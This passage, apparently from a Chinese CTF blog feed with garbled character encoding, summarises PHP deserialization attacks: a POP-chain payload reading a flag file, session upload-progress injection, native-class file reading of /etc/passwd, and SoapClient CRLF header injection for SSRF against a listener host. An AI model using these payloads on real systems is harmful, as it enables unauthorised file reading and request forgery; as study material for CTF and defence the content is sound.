class="hljs-string">&quot; year!&quot;</span>;<br><br>        &#125;<br>         <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;zodiac=<span class="hljs-string">&quot;Hu&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">show</span>();<br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)#3</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;zodiac));<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;zodiac = <span class="hljs-string">&#x27;hu&#x27;</span>;<br>        &#125;<br><br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>å…ˆæ„é€ popé“¾<br><code>O:5:&quot;Happy&quot;:1:&#123;s:5:&quot;happy&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:4:&quot;Year&quot;:1:&#123;s:6:&quot;zodiac&quot;;N;&#125;s:5:&quot;robot&quot;;s:6:&quot;zodiac&quot;;s:8:&quot;notrobot&quot;;s:5:&quot;/f1ag&quot;;&#125;s:5:&quot;robot&quot;;N;s:8:&quot;notrobot&quot;;N;&#125;&#125;</code></p>
<p>çœ‹ä¸‹phpinfoä¸­å…³äºsessionçš„ä¿¡æ¯ï¼Œå¯ä»¥çŸ¥é“å½“å‰index.phpç”¨çš„æ˜¯<code>php</code>å¼•æ“ï¼Œå…¶ä»–é¡µé¢é»˜è®¤ç”¨<code>php_serialize</code>å¼•æ“ï¼Œä¸”<code>session.upload_progress.cleanup=Off</code>ï¼Œæ„å‘³ç€phpä¸ä¼šç«‹å³æ¸…ç©ºå¯¹åº”çš„sessionæ–‡ä»¶ï¼Œå°±ä¸ç”¨è¿›è¡Œæ¡ä»¶ç«äº‰</p>
<p><img src="/img/summary/php_unserialize-4.png"></p>
<p>æ„é€ <code>POST</code>è¡¨å•ï¼Œæäº¤ä¼ å…¥åºåˆ—åŒ–å­—ç¬¦ä¸²</p>
<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://dece2f58-5f4b-4bd0-904a-ac58efcf9623.challenges.ctfer.com:8080/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;lewiserii&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>å› ä¸ºè¦æ”¾åˆ°<code>filename</code>ä¸­çš„åŒå¼•å·ä¸­ï¼Œæ‰€ä»¥è¿™é‡Œè¦è½¬ä¹‰ä¸€ä¸‹åŒå¼•å·ï¼Œåœ¨æ‹¼æ¥ä¸Š<code>|</code>ï¼Œæ³¨æ„ä¸€å®šè¦å¸¦ä¸Š<code>PHPSESSID</code></p>
<p><img src="/img/summary/php_unserialize-5.png"></p>
<blockquote>
<p>ä¼ªé€ PHP_SESSION_UPLOAD_PROGRESSçš„å€¼æ—¶ï¼Œå€¼ä¸­ä¸€æ—¦å‡ºç°|ï¼Œå°†ä¼šå¯¼è‡´æ•°æ®å†™å…¥sessionæ–‡ä»¶å¤±è´¥ï¼Œæ‰€ä»¥ç”¨filename</p>
</blockquote>
<h1 id="phpåŸç”Ÿç±»ååºåˆ—åŒ–"><a href="#phpåŸç”Ÿç±»ååºåˆ—åŒ–" class="headerlink" title="phpåŸç”Ÿç±»ååºåˆ—åŒ–"></a>phpåŸç”Ÿç±»ååºåˆ—åŒ–</h1><p>å¦‚æœåœ¨ä»£ç å®¡è®¡ä¸­æœ‰ååºåˆ—åŒ–ç‚¹ï¼Œä½†åœ¨ä»£ç ä¸­æ‰¾ä¸åˆ°popé“¾ï¼Œå¯ä»¥åˆ©ç”¨phpå†…ç½®ç±»æ¥è¿›è¡Œååºåˆ—åŒ–</p>
<h2 id="åŸç”Ÿæ–‡ä»¶æ“ä½œç±»"><a href="#åŸç”Ÿæ–‡ä»¶æ“ä½œç±»" class="headerlink" title="åŸç”Ÿæ–‡ä»¶æ“ä½œç±»"></a>åŸç”Ÿæ–‡ä»¶æ“ä½œç±»</h2><p><strong>å¯éå†ç›®å½•ç±»ï¼š</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">DirectoryIterator</span> ç±»<br><span class="hljs-built_in">FilesystemIterator</span> ç±»<br><span class="hljs-built_in">GlobIterator</span> ç±»<br></code></pre></td></tr></table></figure>

<p>FilesystemIterator ç±»ä¸ DirectoryIterator ç±»ç›¸åŒï¼Œæä¾›äº†ä¸€ä¸ªç”¨äºæŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç›®å½•å†…å®¹çš„ç®€å•æ¥å£ã€‚è¯¥ç±»çš„æ„é€ æ–¹æ³•å°†ä¼šåˆ›å»ºä¸€ä¸ªæŒ‡å®šç›®å½•çš„è¿­ä»£å™¨ã€‚</p>
<p>GlobIterator ç±»ä¸å‰ä¸¤ä¸ªç±»çš„ä½œç”¨ä¸ä½¿ç”¨æ–¹æ³•ç›¸ä¼¼ï¼Œä½†ä¸ä¸Šé¢ç•¥ä¸åŒçš„æ˜¯å…¶è¡Œä¸ºç±»ä¼¼äºglob()ï¼Œå¯ä»¥é€šè¿‡æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æ–‡ä»¶è·¯å¾„ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br><br><span class="hljs-comment">//ä¹Ÿå¯ä»¥ä¸glob://åè®®é…åˆä½¿ç”¨æ¥æŸ¥æ‰¾æ–‡ä»¶</span><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*flag*&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;glob:///*flag*&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br><br><span class="hljs-comment">//GlobIteratoræ— éœ€å€ŸåŠ©globåè®®å³å¯æœç´¢å…¨å±€æ–‡ä»¶</span><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-string">&quot;/*flag*&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br></code></pre></td></tr></table></figure>

<p><strong>å¯è¯»å–æ–‡ä»¶ç±»</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">SplFileObject</span> ç±»<br></code></pre></td></tr></table></figure>

<p>SplFileInfo ç±»ä¸ºå•ä¸ªæ–‡ä»¶çš„ä¿¡æ¯æä¾›äº†ä¸€ä¸ªé«˜çº§çš„é¢å‘å¯¹è±¡çš„æ¥å£ï¼Œå¯ä»¥ç”¨äºå¯¹æ–‡ä»¶å†…å®¹çš„éå†ã€æŸ¥æ‰¾ã€æ“ä½œç­‰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//è¯»å–ä¸€ä¸ªæ–‡ä»¶çš„ä¸€è¡Œ</span><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$context</span>;<br><br><span class="hljs-comment">//è¯»å–å¤šè¡Œéœ€è¦éå†æˆ–è€…ä½¿ç”¨ä¼ªåè®®</span><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$context</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>);<br>&#125;<br><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$context</span>;<br></code></pre></td></tr></table></figure>




<h2 id="SoapClientååºåˆ—åŒ–ä¸ssrf"><a href="#SoapClientååºåˆ—åŒ–ä¸ssrf" class="headerlink" title="SoapClientååºåˆ—åŒ–ä¸ssrf"></a>SoapClientååºåˆ—åŒ–ä¸ssrf</h2><p>é¦–å…ˆéœ€è¦äº†è§£ä»€ä¹ˆæ˜¯soap<br>soapï¼Œæ˜¯webServiceä¸‰è¦ç´ (SOAPã€WSDLã€UDDI)ä¹‹ä¸€</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">SOAP: åŸºäºHTTPåè®®ï¼Œé‡‡ç”¨XMLæ ¼å¼ï¼Œç”¨æ¥æè¿°ä¼ é€’ä¿¡æ¯çš„æ ¼å¼ã€‚<br><br>WSDL: ç”¨æ¥æè¿°å¦‚ä½•è®¿é—®å…·ä½“çš„æœåŠ¡ã€‚ï¼ˆç›¸å½“äºè¯´æ˜ä¹¦ï¼‰<br><br>UDDI: ç”¨æˆ·è‡ªå·±å¯ä»¥æŒ‰UDDIæ ‡å‡†æ­å»ºUDDIæœåŠ¡å™¨ï¼Œç”¨æ¥ç®¡ç†ï¼Œåˆ†å‘ï¼ŒæŸ¥è¯¢WebService ã€‚å…¶ä»–ç”¨æˆ·å¯ä»¥è‡ªå·±æ³¨å†Œå‘å¸ƒWebServiceè°ƒç”¨ã€‚ï¼ˆç°åœ¨åŸºæœ¬åºŸå¼ƒï¼‰<br></code></pre></td></tr></table></figure>

<p>ç®€å•æ¥è¯´å°±æ˜¯soapæ˜¯ä¸€ç§åŸºäºhttpçš„ä¼ è¾“åè®®ï¼Œå¯ä»¥å‘èµ·è¯·æ±‚æ¥è®¿é—®è¿œç¨‹æœåŠ¡</p>
<p><a href="https://www.php.net/manual/zh/class.soapclient.php">phpå®˜æ–¹æ‰‹å†Œ</a>ä¸­å¯¹soapclientçš„è§£é‡Šå¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SoapClient</span> </span>&#123;<br><span class="hljs-comment">/* å±æ€§ */</span><br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$uri</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$style</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$use</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$location</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">bool</span> <span class="hljs-variable">$trace</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$compression</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?resource <span class="hljs-variable">$sdl</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?resource <span class="hljs-variable">$typemap</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?resource <span class="hljs-variable">$httpsocket</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?resource <span class="hljs-variable">$httpurl</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_login</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_password</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">bool</span> <span class="hljs-variable">$_use_digest</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_digest</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_proxy_host</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$_proxy_port</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_proxy_login</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_proxy_password</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">bool</span> <span class="hljs-variable">$_exceptions</span> = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_encoding</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">array</span> <span class="hljs-variable">$_classmap</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$_features</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$_connection_timeout</span>;<br><span class="hljs-keyword">private</span> ?resource <span class="hljs-variable">$_stream_context</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_user_agent</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">bool</span> <span class="hljs-variable">$_keep_alive</span> = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$_ssl_method</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$_soap_version</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$_use_proxy</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">array</span> <span class="hljs-variable">$_cookies</span> = [];<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">array</span> <span class="hljs-variable">$__default_headers</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?SoapFault <span class="hljs-variable">$__soap_fault</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$__last_request</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$__last_response</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$__last_request_headers</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$__last_response_headers</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-comment">/* æ–¹æ³• */</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span>(?<span class="hljs-keyword">string</span> <span class="hljs-variable">$wsdl</span>, <span class="hljs-keyword">array</span> <span class="hljs-variable">$options</span> = [])<br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__call</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span>, <span class="hljs-keyword">array</span> <span class="hljs-variable">$args</span>): <span class="hljs-keyword">mixed</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__doRequest</span>(<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$request</span>,<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$location</span>,<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$action</span>,<br>    <span class="hljs-keyword">int</span> <span class="hljs-variable">$version</span>,<br>    <span class="hljs-keyword">bool</span> <span class="hljs-variable">$oneWay</span> = <span class="hljs-literal">false</span><br>): ?<span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getCookies</span>(): <span class="hljs-keyword">array</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getFunctions</span>(): ?<span class="hljs-keyword">array</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastRequest</span>(): ?<span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastRequestHeaders</span>(): ?<span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastResponse</span>(): ?<span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastResponseHeaders</span>(): ?<span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getTypes</span>(): ?<span class="hljs-keyword">array</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__setCookie</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span>, ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$value</span> = <span class="hljs-literal">null</span>): <span class="hljs-keyword">void</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__setLocation</span>(?<span class="hljs-keyword">string</span> <span class="hljs-variable">$location</span> = <span class="hljs-literal">null</span>): ?<span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__setSoapHeaders</span>(SoapHeader|<span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$headers</span> = <span class="hljs-literal">null</span>): <span class="hljs-keyword">bool</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__soapCall</span>(<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span>,<br>    <span class="hljs-keyword">array</span> <span class="hljs-variable">$args</span>,<br>    ?<span class="hljs-keyword">array</span> <span class="hljs-variable">$options</span> = <span class="hljs-literal">null</span>,<br>    SoapHeader|<span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$inputHeaders</span> = <span class="hljs-literal">null</span>,<br>    <span class="hljs-keyword">array</span> &amp;<span class="hljs-variable">$outputHeaders</span> = <span class="hljs-literal">null</span><br>): <span class="hljs-keyword">mixed</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>å…ˆä»æ‰‹å†Œä¸­çœ‹soapçš„æ„é€ æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°<code>$wsdl</code>ç”¨æ¥æŒ‡æ˜æ˜¯å¦ä¸ºwsdlæ¨¡å¼ï¼Œç¬¬äºŒä¸ªå‚æ•°<code>$options</code>æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚<br>å½“åœ¨ç¬¬ä¸€ä¸ªå‚æ•°ä¸­æŒ‡æ˜äº†wsdlæ¨¡å¼åï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å¯é€‰çš„ï¼Œå¯ä»¥æ²¡æœ‰ï¼›å½“ç¬¬ä¸€ä¸ªå‚æ•°è®¾ç½®ä¸ºéwsdlæ¨¡å¼åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸­å¿…é¡»è®¾ç½®uriå’Œlocationé€‰é¡¹ã€‚locationå°±æ˜¯ç›®æ ‡urlï¼Œuriæ˜¯soapæœåŠ¡çš„å‘½ä»¤ç©ºé—´</p>
<p><img src="/img/summary/php_unserialize-6.png"></p>
<p>å†çœ‹__call()æ–¹æ³•ï¼Œå½“è°ƒç”¨ç±»ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶å°±ä¼šè§¦å‘ï¼Œå½“è§¦å‘è¿™ä¸ªæ–¹æ³•åï¼Œå®ƒå°±ä¼šå‘locationä¸­çš„ç›®æ ‡URLå‘é€ä¸€ä¸ªsoapè¯·æ±‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://20.2.129.79:7777&#x27;</span>));<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();<br></code></pre></td></tr></table></figure>

<p>åœ¨vpsä¸Šç›‘å¬å¯¹åº”çš„ç«¯å£</p>
<p><img src="/img/summary/php_unserialize-7.png"></p>
<p>å¯ä»¥æ¥æ”¶åˆ°ä¸€ä¸ªpostè¯·æ±‚ï¼Œå¹¶ä¸”<code>SOAPAction</code>çš„å€¼æ˜æ˜¾æ˜¯å¯æ§çš„ï¼Œé‚£ä¹ˆåˆ©ç”¨crlfæˆ‘ä»¬å°±èƒ½æ§åˆ¶æ•°æ®åŒ…äº†</p>
<p>æ¯”å¦‚æ’å…¥ä¸€ä¸ªcookie</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;aaa^^Cookie: test=123^^&#x27;</span>,<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://20.2.129.79:7777&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-variable">$b</span>);<br><br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/summary/php_unserialize-8.png"></p>
<p>ä½†æ˜¯å¯¹äºPOSTæ•°æ®åŒ…ï¼Œè¿˜å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå³Content-Typeçš„å€¼ï¼Œé»˜è®¤æ˜¯text&#x2F;xmlï¼Œæˆ‘ä»¬ä¿®æ”¹çš„SOAPActionåœ¨Content-Typeçš„ä¸‹é¢ï¼Œæ— æ³•æ§åˆ¶Content-Typeï¼Œä¹Ÿå°±ä¸èƒ½æ§åˆ¶POSTçš„æ•°æ®</p>
<p>åœ¨headeré‡ŒUser-Agentåœ¨Content-Typeå‰é¢ï¼Œæ‰‹å†Œä¸­ä¹Ÿæåˆ°äº†å¦‚ä½•è®¾ç½®User-Agentï¼Œæˆ‘ä»¬å¯ä»¥åœ¨User-Agentä¸­æ³¨å…¥crlfï¼Œä»è€Œæ§åˆ¶Content-Typeçš„å€¼</p>
<p><img src="/img/summary/php_unserialize-9.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$post_data</span> = <span class="hljs-string">&quot;data=abc&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&#x27;Mozilla/5.0^^Content-Type: application/x-www-form-urlencoded^^Content-Length: &#x27;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post_data</span>).<span class="hljs-string">&#x27;^^^^&#x27;</span>.<span class="hljs-variable">$post_data</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://20.2.129.79:7777&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-variable">$b</span>);<br><br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();<br><span class="hljs-comment">//echo urlencode($b);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>è¿˜éœ€è¦åœ¨ç»“å°¾è®¾ç½®ä¸€ä¸ªContent-Lengthï¼Œä¸€æ–¹é¢å¯¹äºpoståŒ…æ˜¯å¿…é¡»çš„ï¼Œå¦ä¸€æ–¹é¢è¿˜èƒ½è®©å¤šä½™çš„æ•°æ®ä¸¢å¼ƒï¼Œä¸å½±å“æˆ‘ä»¬è®¾å®šçš„å€¼</p>
<p><img src="/img/summary/php_unserialize-10.png"></p>
<p>è¿™æ ·å°±èƒ½å®ç°soapclient+crlfç»„åˆæ‹³æ”»å‡»ssrfäº†</p>
<hr>

<p>å‚è€ƒæ–‡ç« :<br><a href="https://blog.csdn.net/mochu7777777/article/details/106909777">ç”±æµ…å…¥æ·±ç†è§£PHPååºåˆ—åŒ–æ¼æ´</a><br><a href="https://blog.csdn.net/solitudi/article/details/113588692">[CTF]PHPååºåˆ—åŒ–æ€»ç»“</a><br><a href="https://spaceman-911.gitee.io/2021/06/30/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E8%B6%85%E7%BB%86%E7%9A%84%EF%BC%89/">PHP-ååºåˆ—åŒ–ï¼ˆè¶…ç»†çš„ï¼‰</a></p>
]]></content>
      <categories>
        <category>æ€»ç»“</category>
      </categories>
      <tags>
        <tag>æ€»ç»“</tag>
        <tag>php</tag>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>ssrfå­¦ä¹ æ€»ç»“</title>
    <url>/posts/76604b1a/</url>
